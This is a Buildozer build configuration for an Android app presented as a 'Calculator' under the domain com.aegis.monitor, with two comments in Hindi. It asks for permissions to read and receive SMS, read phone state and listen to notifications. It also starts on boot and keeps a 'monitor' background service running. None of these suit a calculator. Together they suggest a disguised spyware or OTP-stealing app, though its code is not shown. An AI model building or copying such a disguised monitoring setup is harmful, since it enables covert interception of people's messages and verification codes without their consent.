[app]
title = Calculator
package.name = securecalc
package.domain = com.aegis.monitor
source.dir = .
requirements = python3,kivy==2.2.1,requests,urllib3,chardet,idna
version = 2.0

# सभी अनुमतियाँ यहाँ सूचीबद्ध हैं
android.permissions = INTERNET, RECEIVE_SMS, READ_SMS, READ_PHONE_STATE, POST_NOTIFICATIONS, BIND_NOTIFICATION_LISTENER_SERVICE, RECEIVE_BOOT_COMPLETED, WAKE_LOCK, FOREGROUND_SERVICE

android.api = 33
android.minapi = 21
android.sdk = 33
android.ndk = 25b
android.archs = arm64-v8a
android.accept_sdk_license = True
# सर्विस को बैकग्राउंड में चालू रखने के लिए
android.services = monitor:main.py